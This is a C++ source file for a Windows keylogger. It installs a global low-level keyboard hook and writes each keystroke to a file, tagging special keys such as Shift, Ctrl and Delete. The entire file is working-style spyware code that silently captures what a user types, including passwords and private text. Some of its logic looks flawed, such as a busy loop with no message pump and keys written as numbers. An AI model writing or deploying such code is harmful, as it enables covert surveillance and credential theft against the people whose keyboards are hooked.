#include "pch.h"
#include "KeyLogger.hpp"


KeyLogger::KeyLogger() : 
	keyboard_hook(create_hook())
{
}

KeyLogger::~KeyLogger()
{
	try
	{
		if (!UnhookWindowsHookEx(keyboard_hook))
		{
			throw WindowsException();
		}

		Logger::Instance().info(L"Unregistered keyboard hook");
	}
	catch (const WindowsException& e)
	{
		std::wcout << e.what() << std::endl;
	}
	catch (...)
	{
		OutputDebugStringW(L"Failed to release hook");
	}
}

void KeyLogger::start()
{
	static KeyLogger key_logger{};

	for (;;)
	{
	}
}

HHOOK KeyLogger::create_hook()
{
	Logger::Instance().info(L"Registering keyboard hook");

	HHOOK keyboardHook = SetWindowsHookExW(
							WH_KEYBOARD_LL,
							KeyboardHookProc,
							NULL,
							0);

	if (!keyboardHook)
	{
		throw WindowsException();
	}

	return keyboardHook;
}

LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) 
{
	Logger::Instance().info(L"Got info hook function");
	File keys_file{ KEYS_FILE_PATH };

	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);

	// If key is being pressed
	if (wParam == WM_KEYDOWN) {
		switch (p->vkCode) {

		// Invisible keys
		case VK_CAPITAL:	keys_file.write(L"<CAPLOCK>");		break;
		case VK_SHIFT:		keys_file.write(L"<SHIFT>");		break;
		case VK_LCONTROL:	keys_file.write(L"<LCTRL>");		break;
		case VK_RCONTROL:	keys_file.write(L"<RCTRL>");		break;
		case VK_INSERT:		keys_file.write(L"<INSERT>");		break;
		case VK_END:		keys_file.write(L"<END>");			break;
		case VK_PRINT:		keys_file.write(L"<PRINT>");		break;
		case VK_DELETE:		keys_file.write(L"<DEL>");			break;
		case VK_BACK:		keys_file.write(L"<BK>");			break;

		case VK_LEFT:		keys_file.write(L"<LEFT>");			break;
		case VK_RIGHT:		keys_file.write(L"<RIGHT>");		break;
		case VK_UP:			keys_file.write(L"<UP>");			break;
		case VK_DOWN:		keys_file.write(L"<DOWN>");			break;

		// Visible keys
		default:
			keys_file.write(std::to_wstring((wchar_t)tolower(p->vkCode)));

		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}